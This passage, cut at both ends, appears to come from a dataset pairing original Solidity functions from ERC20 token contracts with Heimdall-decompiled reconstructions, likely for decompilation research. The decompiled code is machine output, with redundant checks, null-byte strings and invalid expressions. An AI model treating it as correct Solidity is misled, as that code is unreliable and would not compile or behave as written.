0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        storage_map_e[var_a] = storage_map_e[var_a] + 0;\n        uint256 var_c = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        require(!(arg1 < 0), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(!(!bytes1(routerCA / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer from the zero address\");\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(arg0);\n        var_b = 0x24;\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer from the zero address\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer from the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x24;\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer from the zero address\");\n        require(!(buyDevFeeg > 0), \"ERC20: transfer from the zero address\");\n        require(!0, \"ERC20: transfer from the zero address\");\n        require(!(arg1 < 0), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        if (!tradingActive / 0x010000) {\n            if (!tradingActive / 0x010000) {\n                if (!tradingActive / 0x010000) {\n                    if (!tradingActive / 0x010000) {\n                        if (!tradingActive / 0x010000) {\n                        }\n                    }\n                }\n            }\n        }\n        require(bytes1(tradingActive / 0x0100), \"Trading is not active.\");\n        var_a = address(msg.sender);\n        var_b = 0x22;\n        require(bytes1(storage_map_e[var_a]), \"Trading is not active.\");\n        require(bytes1(storage_map_e[var_a]), \"Trading is not active.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x16;\n        var_f = 0x54726164696e67206973206e6f74206163746976652e00000000000000000000;\n        if (!address(arg0)) {\n            if (!address(arg0)) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xa5f88146Cff0673fCea44A32ddB845302c835619", "original_solidity_code": "function updateDevWallet(address newWallet) external onlyOwner {\r\n        emit devWalletUpdated(newWallet, devWallet);\r\n        devWallet = newWallet;\r\n    }", "heimdall_decompiled_code": "function updateDevWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit devWalletUpdated(address(arg0), address(devWallet));\n        devWallet = (address(arg0)) | (uint96(devWallet));\n    }"}
{"contract_address": "0xe2BFF0b8121D4977F0aFd680dB7d3eADDa4Ab3Df", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\nemit OwnershipTransferred(_owner, address(0));\r\n_owner = address(0);\r\n}", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0xEA00f45b33879A1D55f91ff260C20c96a577E566", "original_solidity_code": "function disableTransferDelay() external onlyOwner returns (bool) {\r\n        transferDelayEnabled = false;\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function disableTransferDelay() public returns (bool) {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        transferDelayEnabled = uint248(transferDelayEnabled);\n        var_a = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x842FD31eAd327AE42D19B7BFbdB045d3A219c662", "original_solidity_code": "function changeLpPair(address newPair) external onlyOwner {\r\n        isLpPair[newPair] = true;\r\n        emit _changePair(newPair);\r\n    }", "heimdall_decompiled_code": "function changeLpPair(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(getOwner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_e = address(arg0);\n        var_f = 0x04;\n        storage_map_f[var_e] = 0x01 | (uint248(storage_map_f[var_e]));\n        address var_a = address(arg0);\n        emit _changePair(address(arg0));\n    }"}
{"contract_address": "0x5Ccbc0cbaFAB8311086076C7B5f245D7fD080981", "original_solidity_code": "function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x06;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x4a332C2EE399881195E10544033c2378E732e2C2", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a] > 0);\n        store_h = (0x01 * 0x01000000000000000000000000000000000000000000) | (uint248(store_h));\n        require(!0x02 > 0xffffffffffffffff);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x41;\n        var_d = 0x02;\n        uint256 var_e = var_e + 0x60;\n        require(!0x02);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_f = address(this);\n        var_g = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).WETH(var_h); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!(((var_e + ret0.length) - var_e) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_i == (address(var_i)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_j = address(var_i);\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_g / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_g / 0x01);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_g / 0x01), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        uint256 var_n = ((0x04 + var_e) + 0xa0) - (0x04 + var_e);\n        uint256 var_p = var_e.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_g / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_g / 0x01).Unresolved_791ac947(var_l); // call\n        store_h = (0 * 0x01000000000000000000000000000000000000000000) | (uint248(store_h));\n        require(!address(this).balance > 0);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xe82fb7255F72B39C1A880E43d92125Ad1bcD504D", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender));\n        require(address(arg0));\n        require(arg1 > 0);\n        require(address(owner) == (address(msg.sender)));\n        require(address(owner) == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a]));\n        require(!bytes1(storage_map_b[var_a]));\n        require(store_c > store_d, \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_e == ((store_e * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_e * arg1) / arg1) == store_e, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_i = 0x40 + var_i;\n        var_d = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_i.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(bytes1(transferDelayEnabled)), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(address(store_g) == (address(arg0)), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(store_h)) == (address(arg0))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = tx.origin;\n        var_b = 0x05;\n        require(block.number > storage_map_b[var_a], \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x49;\n        var_m = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_o = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_p = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = tx.origin;\n        var_b = 0x05;\n        storage_map_b[var_a] = block.number;\n        require(!(address(store_h) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_h) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_h) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_h) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_h) == (address(arg0))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!((store_e * arg1) / 0x64), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (((store_e * arg1) / 0x64) + storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(((store_e * arg1) / 0x64) + storage_map_b[var_a] < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = ((store_e * arg1) / 0x64) + storage_map_b[var_a];\n        uint256 var_k = (store_e * arg1) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (store_e * arg1) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_i = 0x40 + var_i;\n        var_k = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_i = 0x40 + var_i;\n        var_r = 0x1e;\n        var_s = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((store_e * arg1) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_t = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        uint256 var_u = var_i.length;\n        uint256 var_v = 0;\n        var_w = var_n;\n        var_v = 0;\n        if (!(arg1 - ((store_e * arg1) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_c > store_j) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_h / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_c > store_l) {\n                if (0 - arg1) {\n                }\n                require(!((arg1 - ((store_e * arg1) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_c > store_l, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_g) == (address(arg0))) {\n            if (address(store_g) == (address(arg0))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x5Ba89777D1172C70F410d74dBBeF55150B44Da28", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender));\n        require(address(arg0));\n        require(arg1 > 0);\n        require(address(owner) == (address(msg.sender)));\n        require(address(owner) == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a]));\n        require(!bytes1(storage_map_b[var_a]));\n        require(store_c > store_d, \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_e == ((store_e * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_e * arg1) / arg1) == store_e, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_i = 0x40 + var_i;\n        var_d = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_i.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(address(store_f) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_f) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_f) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(address(store_f) == (address(arg0)), \"SafeMath: addition overflow\");\n        var_a = address(arg0);\n        var_b = 0x03;\n        require(!(!bytes1(storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        require(!(address(store_f) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_f) == (address(arg0))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!((store_e * arg1) / 0x64), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (((store_e * arg1) / 0x64) + storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(((store_e * arg1) / 0x64) + storage_map_b[var_a] < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = ((store_e * arg1) / 0x64) + storage_map_b[var_a];\n        uint256 var_k = (store_e * arg1) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (store_e * arg1) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_i = 0x40 + var_i;\n        var_k = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_i = 0x40 + var_i;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((store_e * arg1) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_s = 0x20;\n        uint256 var_t = var_i.length;\n        uint256 var_u = 0;\n        var_v = var_n;\n        var_u = 0;\n        if (!(arg1 - ((store_e * arg1) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_c > store_h) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_f / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_c > store_j) {\n                if (0 - arg1) {\n                }\n                if (0 - arg1) {\n                }\n                require(!((arg1 - ((store_e * arg1) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_c > store_j, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_l) == (address(arg0))) {\n            if (address(store_l) == (address(arg0))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x094f17A0D2C12d8AB36a5a27d14DbC47B9cFdC30", "original_solidity_code": "function openTrading() external {\r\n        require(!tradingOpen);\r\n        require(msg.sender == deployer);\r\n        tradingOpen = true;        \r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(!bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(0x9cb6da40d96aa44cc0314df6814033c3513e75a6 == msg.sender);\n        store_a = 0x01000000000000000000000000000000000000000000 | (uint248(store_a));\n    }"}
{"contract_address": "0x10A7A2212f6b6ffE22d339D8Aa6e89a17ad8b1ad", "original_solidity_code": "function createPairAndAddLP() public payable onlyOwner {\n        // create pair This:ETH\n        if (swapV2Pair == address(0)) {\n            IUniswapV2Factory factory = IUniswapV2Factory(\n                swapV2Router.factory()\n            );\n            swapV2Pair = factory.createPair(address(this), swapV2Router.WETH());\n        }\n        _setAutomatedMarketMakerPair(address(swapV2Pair), true);\n\n        addLiquidity(balanceOf(address(this)), address(this).balance);\n    }", "heimdall_decompiled_code": "function createPairAndAddLP() public payable {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(swapV2Pair / 0x01) - 0);\n        address var_f = address(swapV2Pair / 0x01);\n        var_g = 0x17;\n        storage_map_h[var_f] = (0x01 * 0x01) | (uint248(storage_map_h[var_f]));\n        emit SetAutomatedMarketMakerPair(address(swapV2Pair / 0x01), 0x01);\n        var_f = address(this);\n        uint256 var_g = 0;\n        var_a = 0xf305d71900000000000000000000000000000000000000000000000000000000;\n        var_b = address(this);\n        address var_d = storage_map_h[var_f];\n        uint256 var_e = 0;\n        uint256 var_h = 0;\n        address var_i = address(owner / 0x01);\n        uint256 var_j = block.timestamp;\n        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).{ value: address(this).balance }Unresolved_f305d719(var_b); // call\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x60);\n        require(var_k == (var_k));\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).factory(var_b); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_k == (address(var_k)));\n        var_l = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_k == (address(var_k)));\n        var_m = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        var_e = address(this);\n        var_h = address(var_k);\n        (bool success, bytes memory ret0) = address(var_k).{ value: var_g ether 